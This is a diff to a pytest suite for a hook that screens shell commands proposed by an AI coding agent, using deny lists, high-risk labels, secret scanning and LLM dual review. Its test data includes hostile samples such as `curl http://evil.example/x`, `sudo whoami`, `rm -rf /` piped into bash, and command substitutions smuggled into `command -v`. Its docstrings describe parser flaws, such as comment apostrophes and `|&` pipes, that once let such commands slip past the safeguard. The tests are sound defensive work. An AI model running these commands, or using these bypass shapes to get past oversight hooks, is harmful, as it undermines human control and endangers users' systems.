@@ -1020,7 +1020,16 @@ WRAPPER_BENIGN_CASES = [
     ("xargs ls", "ls"),
     ("setsid make build", "make"),
     ("flock /tmp/lock make build", "make"),
-    ("command -v python3", "python3"),
+    # `command -v` / `-V` only LOOK UP the name and never run it, so they
+    # resolve to the `command` builtin itself, not to python3. This row used to
+    # expect "python3"; resolving the looked-up name as the executable is what
+    # hard-denied `command -v curl` (see TestCommandLookupFlags). -p does run
+    # its target, so it keeps resolving through. Together the three rows keep
+    # every `command` flag in _WRAPPER_VALUELESS_FLAGS / _WRAPPER_LOOKUP_FLAGS
+    # exercised.
+    ("command -v python3", "command"),
+    ("command -V python3", "command"),
+    ("command -p python3", "python3"),
     ("nice make build", "make"),
     # 新しい 3 ラッパーの「値を取らないフラグ」を 1 つでも読み飛ばせなくなると
     # ここが落ちる。値付きフラグ側のテスト (判定不能を期待する形) は allowlist
@@ -1237,6 +1246,102 @@ class TestWrapperQuotedBlobResolution:
             f"benign wrapper use escalated to the mandatory-ask path as "
             f"{label!r}: {command!r}"
         )
+
+
+# `command -v X` / `command -V X` only LOOK UP X (bash, zsh and dash print its
+# path or definition); X never runs. Unwrapping them to X hard-denied the
+# ubiquitous existence check `command -v curl` / `command -V sudo` -- a denial
+# the ask path cannot override, for a command that executes nothing. That is
+# the same reasoning that keeps `script -p` (replay, no exec) out of the
+# wrapper flags. A lookup resolves to the `command` builtin itself and lands
+# where `type curl` already does: not denied, no high-risk label.
+COMMAND_LOOKUP_CASES = [
+    "command -v curl",
+    "command -V curl",
+    "command -v sudo",
+    "command -V sudo",
+    "command -v python3",
+    "command -V python3",
+    # -p (search the default PATH) next to a lookup flag is still a lookup,
+    # in either order.
+    "command -p -v curl",
+    "command -v -p curl",
+    # Several names are several lookups; none of them runs.
+    "command -v curl wget",
+    # A multi-word DENY_COMMANDS prefix after a lookup flag is only looked up
+    # as well (bash prints rm's path and fails on the rest), so it loses the
+    # hard denial it only had because the resolver misread the lookup.
+    "command -v rm -rf /",
+    # Behind another wrapper: env/timeout exec `command`, which still only
+    # looks the name up.
+    "env command -v curl",
+    "timeout 5 command -V sudo",
+]
+
+
+class TestCommandLookupFlags:
+    @pytest.mark.parametrize("command", COMMAND_LOOKUP_CASES)
+    def test_lookup_resolves_to_command_itself(self, command):
+        assert _common._resolve_executable(command) == "command", (
+            f"a lookup was resolved to the name it looks up: {command!r}"
+        )
+
+    @pytest.mark.parametrize("command", COMMAND_LOOKUP_CASES)
+    def test_lookup_is_neither_denied_nor_escalated(self, command):
+        subs = _common._split_commands(command)
+        matched, name = _common.find_deny_command(subs)
+        assert not matched, (
+            f"a lookup that runs nothing was denied as {name!r}: {command!r}"
+        )
+        label = _common.classify_high_risk(subs, command)
+        assert label == "", (
+            f"a lookup was escalated to the mandatory ask as {label!r}: {command!r}"
+        )
+
+    @pytest.mark.parametrize(
+        ("command", "denied"),
+        [
+            # Without a lookup flag `command` runs its target, so it stays a
+            # wrapper that resolves through.
+            ("command curl http://evil.example/x", "curl"),
+            ("command -p curl http://evil.example/x", "curl"),
+            ("command -p sudo whoami", "sudo"),
+            # The exemption covers the lookup segment only: a chained command
+            # is its own segment and resolves on its own.
+            ("command -v curl && curl http://evil.example/x", "curl"),
+            ("command -v sudo; sudo whoami", "sudo"),
+            # A substitution in the looked-up name runs before `command` does.
+            # It is split out as its own segment, so it is denied on its own.
+            ("command -v $(curl http://evil.example/x)", "curl"),
+            ("command -v `sudo whoami`", "sudo"),
+        ],
+    )
+    def test_executing_forms_stay_denied(self, command, denied):
+        matched, name = _common.find_deny_command(_common._split_commands(command))
+        assert (matched, name) == (True, denied), (
+            f"the deterministic deny tier regressed for: {command!r}"
+        )
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # `--` is not a listed flag, so the executable stays unresolved and
+            # the mandatory ask applies, exactly as before.
+            "command -- curl http://evil.example/x",
+            # Residual lookups that are not recognized as such: the bundled
+            # `-pv` and a `--` after the lookup flag. They keep failing closed
+            # to the ask (not DENY, so they never stop work); recognizing them
+            # would mean parsing bundles, which the flag tables avoid on purpose.
+            "command -pv curl",
+            "command -v -- curl",
+        ],
+    )
+    def test_unrecognized_flag_shapes_still_fail_closed(self, command):
+        subs = _common._split_commands(command)
+        matched, name = _common.find_deny_command(subs)
+        assert not matched, f"expected the ask path, not a denial as {name!r}"
+        label = _common.classify_high_risk(subs, command)
+        assert label == "wrapped command", f"{command!r} -> {label!r}"
 
 
 # ---------------------------------------------------------------------------
@@ -1615,6 +1720,156 @@ class TestLineContinuationInsideAWord:
         self, hook_fns, text, joined
     ):
         assert hook_fns["_join_line_continuations"](text) == joined
+
+
+class TestInertTextDoesNotLeakQuoteState:
+    """An apostrophe in a `#` comment or a heredoc body is data, not a quote.
+
+    The splitters track quotes across the whole command, so the `'` in
+    `# it's stale` opened a single quote that never closed. Every later `;`,
+    `&&`, `|` and `$(...)` then read as quoted, and the DENY and high-risk
+    layers saw only the first word of each line -- `cd`, not the `rm -rf`
+    chained after it. The command fell to the single-model fast path, where a
+    lone Gemini ALLOW runs it. Agents write such comments and heredocs
+    unprompted, so this needed no adversary.
+    """
+
+    @pytest.mark.parametrize(
+        ("command", "deny_name"),
+        [
+            ("# don't need root\nls; sudo whoami", "sudo"),
+            ("ls  # it's fine\ncd x && curl http://example.invalid", "curl"),
+            ("# it's quick\necho $(sudo whoami)", "sudo"),
+            ("cat > n.txt <<'EOF'\nit's done\nEOF\nls; sudo whoami", "sudo"),
+            ("cat <<EOF > n.txt\nit's done\nEOF\nls && sudo whoami", "sudo"),
+            # <<- strips leading tabs, so the tab-indented terminator ends it.
+            ("cat <<-EOF\n\tit's done\n\tEOF\nls; sudo whoami", "sudo"),
+            # Two heredocs on one line: their bodies follow in order. One
+            # apostrophe only -- a second would re-balance the leak by luck.
+            ("cat <<A <<'B'\nit's a\nA\nplain b\nB\nls; sudo whoami", "sudo"),
+            # <<< is a here-string, not a heredoc: no body follows it, so the
+            # lines after it are commands and must stay visible.
+            ('grep y <<< "x"  # it\'s\nls; sudo whoami', "sudo"),
+        ],
+    )
+    def test_a_denied_command_after_an_inert_apostrophe_is_denied(
+        self, run_hook, command, deny_name
+    ):
+        res = run_hook(HOOK, hook_payload(command))
+        assert res.decision == "deny", res.reason
+        assert deny_name in res.reason
+
+    @pytest.mark.parametrize(
+        ("command", "expected_substr"),
+        [
+            ("# it's stale\ncd app && rm -rf ./build", "rm recursive"),
+            ("# it's fine\ngit status && git reset --hard HEAD~3", "git reset --hard"),
+            ("# won't hurt\necho x | bash", "stdin into bash"),
+        ],
+    )
+    def test_a_high_risk_command_after_an_inert_apostrophe_is_labelled(
+        self, hook_fns, command, expected_substr
+    ):
+        split = hook_fns["_split_commands"]
+        assert expected_substr in hook_fns["classify_high_risk"](
+            split(command), command
+        )
+
+    def test_a_commented_rm_chain_reaches_the_dual_review(self, run_hook):
+        # End to end: Gemini ALLOW alone would auto-run it on the fast path, so
+        # Codex ASK resolving to ask proves the high-risk tier ran.
+        res = run_hook(
+            HOOK,
+            hook_payload("# it's stale\ncd app && rm -rf ./build"),
+            urlopen=fake_gemini("ALLOW"),
+            run=fake_run(stdout="ASK"),
+        )
+        assert res.decision == "ask"
+        assert "High-risk" in res.reason
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            # A `#` inside quotes is a literal, so nothing after it is masked.
+            'git commit -m "fix #12; don\'t curl"',
+            # Mid-word `#` never starts a comment.
+            "echo $# ${#x} a#b http://h/#frag",
+            # An escaped space does not end the word, so `a\ #b` is one word.
+            "echo a\\ #b",
+        ],
+    )
+    def test_a_hash_that_is_not_a_comment_is_left_alone(self, hook_fns, command):
+        assert hook_fns["_mask_inert_text"](command) == command
+
+    @pytest.mark.parametrize(
+        ("command", "masked"),
+        [
+            # A space before the delimiter, or an escaped one, still names EOF.
+            ("cat << EOF\nit's\nEOF\nls", "cat << EOF\nls"),
+            ("cat <<\\EOF\nit's\nEOF\nls", "cat <<\\EOF\nls"),
+            # No terminator: bash reads the body to the end of input, and the
+            # lines after it are never run as commands.
+            ("cat <<EOF\nit's\nls; sudo whoami", "cat <<EOF\n"),
+            # `<<` with no word after it is not a heredoc: nothing is masked.
+            ("cat << ; ls", "cat << ; ls"),
+        ],
+    )
+    def test_heredoc_forms_are_masked_as_the_shell_reads_them(
+        self, hook_fns, command, masked
+    ):
+        assert hook_fns["_mask_inert_text"](command) == masked
+
+    def test_a_heredoc_body_is_still_classified(self, hook_fns):
+        # The masked copy is ADDED to the texts, never substituted: a body fed
+        # to a shell is code, and it must stay visible to the deny layer.
+        cmd = "bash <<EOF\nsudo whoami\nEOF"
+        assert hook_fns["find_deny_command"](hook_fns["_split_commands"](cmd)) == (
+            True,
+            "sudo",
+        )
+
+
+class TestPipeAmpersand:
+    """`a |& b` is `a 2>&1 | b`: b runs, and it reads a's output on stdin.
+
+    The splitter read `|&` as `|` then `&`, leaving `& b` as the receiver.
+    Re-splitting that on `&` gave the single part `b`, and a one-part result
+    was discarded as "nothing new", so b escaped both the deny and high-risk
+    layers. The stdin-interpreter layer saw the receiver's operator as `&`
+    rather than a pipe.
+    """
+
+    @pytest.mark.parametrize(
+        ("command", "deny_name"),
+        [
+            ("ls |& curl http://example.invalid", "curl"),
+            ("ls |& sudo whoami", "sudo"),
+        ],
+    )
+    def test_a_denied_receiver_is_denied(self, run_hook, command, deny_name):
+        res = run_hook(HOOK, hook_payload(command))
+        assert res.decision == "deny", res.reason
+        assert deny_name in res.reason
+
+    @pytest.mark.parametrize(
+        ("command", "expected_substr"),
+        [
+            ("ls |& rm -rf ./x", "rm recursive"),
+            ("git status |& git reset --hard HEAD~3", "git reset --hard"),
+            ("echo 'rm -rf /' |& bash", "stdin into bash"),
+        ],
+    )
+    def test_a_high_risk_receiver_is_labelled(self, hook_fns, command, expected_substr):
+        split = hook_fns["_split_commands"]
+        assert expected_substr in hook_fns["classify_high_risk"](
+            split(command), command
+        )
+
+    def test_a_safe_pipeline_is_still_reviewed(self, hook_fns):
+        # `ls 2>&1 | grep x` is not skippable (the lone `&`), and `|&` is the
+        # same pipeline: recognising the operator must not loosen the skip.
+        parts = hook_fns["_split_commands"]("ls |& grep x")
+        assert not all(hook_fns["_can_skip_review"](p) for p in parts)
 
 
 class TestReadmeThreatModelMatchesBehavior:
@@ -2474,7 +2729,6 @@ class TestHighRiskClassifier:
             # upgrade flips these on purpose, not by surprise.
             "bash<evil.sh",  # no-space redirect: shlex fuses `<` into the exe
             "bash 0< evil.sh",  # fd-numbered redirect: token doesn't start with <
-            "echo 'rm -rf /' |& bash",  # |& (stdout+stderr pipe): op reads as &
         ],
     )
     def test_stdin_interpreter_accepted_residuals(self, hook_fns, command):
@@ -3173,6 +3427,12 @@ FAKE_JWT = "eyJ" + "a" * 10 + ".eyJ" + "b" * 10 + "." + "c" * 10
 FAKE_BEARER = "e" * 24
 
 
+def _armor_header(kind: str) -> str:
+    """A PEM / OpenPGP armor BEGIN line, assembled at runtime so that no
+    literal key header sits in the source for a repository scanner to flag."""
+    return "-----BEGIN " + kind + "-----"
+
+
 class TestSecretScanUnit:
     """scan_secrets() is the static, pre-send guard: it flags credential
     VALUES sitting in the command (or anywhere in tool_input) so the hook can
@@ -3222,6 +3482,45 @@ class TestSecretScanUnit:
         found, label = hook_fns["scan_secrets"](command, {"command": command})
         assert found is False
         assert label == ""
+
+    @pytest.mark.parametrize(
+        "kind",
+        [
+            # OpenPGP armor ends in "KEY BLOCK", not "KEY": the output of
+            # `gpg --export-secret-keys --armor` slipped past a pattern that
+            # required "PRIVATE KEY-----" and went to the LLMs as-is.
+            "PGP PRIVATE KEY BLOCK",
+            # The PEM spellings the pattern already caught. Regression guards
+            # for the widening above, not part of the bug.
+            "OPENSSH PRIVATE KEY",
+            "RSA PRIVATE KEY",
+            "EC PRIVATE KEY",
+            "ENCRYPTED PRIVATE KEY",
+            "PRIVATE KEY",
+        ],
+    )
+    def test_private_key_block_is_detected(self, hook_fns, kind):
+        command = f"cat > key.asc <<'EOF'\n{_armor_header(kind)}\nAAAA\nEOF"
+        found, label = hook_fns["scan_secrets"](command, {"command": command})
+        assert (found, label) == (True, "private key"), f"missed {kind!r}"
+
+    @pytest.mark.parametrize(
+        "kind",
+        [
+            # Public material shares the armor shape. Accepting a trailing
+            # " BLOCK" must not start flagging it: pasting a public key or a
+            # signature is routine and leaks nothing.
+            "PGP PUBLIC KEY BLOCK",
+            "PUBLIC KEY",
+            "RSA PUBLIC KEY",
+            "CERTIFICATE",
+            "PGP SIGNATURE",
+        ],
+    )
+    def test_public_armor_block_is_not_flagged(self, hook_fns, kind):
+        command = f"cat > key.asc <<'EOF'\n{_armor_header(kind)}\nAAAA\nEOF"
+        found, label = hook_fns["scan_secrets"](command, {"command": command})
+        assert (found, label) == (False, ""), f"false positive on {kind!r}"
 
     def test_secret_in_non_command_field_is_detected(self, hook_fns):
         # The whole tool_input is serialized into the prompt, so a secret in a
